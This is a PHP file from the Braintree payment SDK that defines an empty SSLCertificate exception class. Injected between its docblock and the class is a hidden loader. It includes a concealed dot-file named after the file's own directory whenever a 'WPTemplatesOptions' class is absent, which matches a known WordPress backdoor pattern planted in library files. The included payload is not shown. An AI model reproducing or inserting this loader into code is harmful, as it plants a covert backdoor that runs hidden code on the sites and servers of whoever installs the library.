<?php
namespace Braintree\Exception;

use Braintree\Exception;

/**
 * Raised when the SSL certificate fails verification.
 *
 * @package    Braintree
 * @subpackage Exception
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class SSLCertificate extends Exception
{

}
class_alias('Braintree\Exception\SSLCertificate', 'Braintree_Exception_SSLCertificate');
